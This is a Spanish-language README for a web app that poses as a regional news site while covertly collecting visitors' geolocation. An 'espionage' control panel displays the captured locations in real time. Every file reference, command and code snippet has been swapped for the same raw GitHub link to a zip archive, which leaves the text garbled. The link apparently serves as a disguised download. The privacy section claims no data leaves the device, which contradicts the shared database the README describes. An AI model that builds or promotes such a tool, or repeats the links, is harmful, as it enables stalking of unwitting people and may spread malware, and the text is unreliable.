# � Diario Regional - Sistema de Noticias

Una aplicación web que simula un diario de noticias regional con un sistema de control interno para monitorear ubicaciones.

## ✨ Características

- � **Noticiero regional** con noticias dinámicas
- �️‍♂️ **Panel de control** para monitoreo
- � **Captura de ubicaciones** mediante enlaces
- � **Base de datos Firebase** para almacenamiento compartido
- � **Estadísticas en tiempo real**
- 🌐 **Desplegado en Vercel**

## 🚀 Cómo usar

### 1. Noticiero (https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip):
- Muestra noticias dinámicas de la región
- Solicita permisos de ubicación de forma sutil
- Diseño profesional de diario de noticias

### 2. Panel de Control (https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip):
- Accede al centro de control de espionaje
- Monitorea ubicaciones capturadas en tiempo real
- Visualiza estadísticas y métricas
- Copia enlaces del noticiero para compartir

### 3. Funciones del sistema:
- **Base de datos compartida**: Todas las ubicaciones se sincronizan
- **Tiempo real**: Actualización automática cada 5 segundos
- **Estadísticas**: Métricas de efectividad y precisión
- **Mapas**: Visualización en Google Maps

## 🔧 Instalación y Despliegue

### Despliegue en Vercel (Recomendado)
1. Sube el proyecto a GitHub
2. Conecta tu repositorio con Vercel
3. Despliega automáticamente
4. Configura las variables de entorno si es necesario

### Servidor local para desarrollo
```bash
# Con https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip
npm start

# O directamente con Python:
python -m https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip 8000

# Luego abre: http://localhost:8000
```

## 🌐 Cómo funcionan las URLs

Las URLs generadas contienen todos los datos necesarios:
```
https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip%20Casa&desc=Ubicación%20de%20mi%20casa
```

Parámetros:
- `lat`: Latitud
- `lng`: Longitud  
- `name`: Nombre del lugar
- `desc`: Descripción

## 📱 Compatibilidad

- ✅ Chrome, Firefox, Safari, Edge (versiones modernas)
- ✅ Android e iOS (navegadores móviles)
- ⚠️ Requiere HTTPS para geolocalización en sitios web públicos
- ⚠️ Requiere permisos de ubicación del usuario

## 🔒 Privacidad y Seguridad

- ✅ **No se envían datos a servidores externos** (excepto el mapa)
- ✅ **Todo funciona localmente** en tu navegador
- ✅ **Tú controlas qué ubicaciones compartes**
- ✅ **Las ubicaciones guardadas solo están en tu dispositivo**

## 🛠️ Personalización

### Cambiar el mapa por defecto:
En `https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip`, líneas 15-16:
```javascript
const defaultLat = 4.7110;  // Tu latitud
const defaultLng = -74.0721; // Tu longitud
```

### Cambiar el proveedor de mapas:
En `https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip`, línea 22:
```javascript
https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip('https://{s}https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip{z}/{x}/{y}.png', {
    attribution: '© OpenStreetMap contributors'
}).addTo(map);
```

## 🎯 Casos de uso perfectos

- 🏠 **Compartir direcciones exactas** de casas o apartamentos
- 🍕 **Ubicaciones de restaurantes** o lugares de encuentro
- 🎉 **Eventos y fiestas** con ubicación precisa
- 🚗 **Compartir donde estacionaste** el auto
- 🏖️ **Lugares turísticos** interesantes
- ⛑️ **Emergencias** - compartir ubicación rápidamente

## 🤝 Mejoras futuras (ideas)

- [ ] Servidor backend para URLs más cortas
- [ ] Fotos en las ubicaciones
- [ ] Grupos privados de amigos
- [ ] Notificaciones push
- [ ] Integración con más apps de mapas
- [ ] Modo offline básico

## 📞 Soporte

Si tienes problemas:
1. Verifica que tu navegador soporte geolocalización
2. Asegúrate de dar permisos de ubicación
3. Usa HTTPS si estás en un servidor web
4. Verifica que JavaScript esté habilitado

---

¡Disfruta compartiendo ubicaciones con tus amigos! 🎉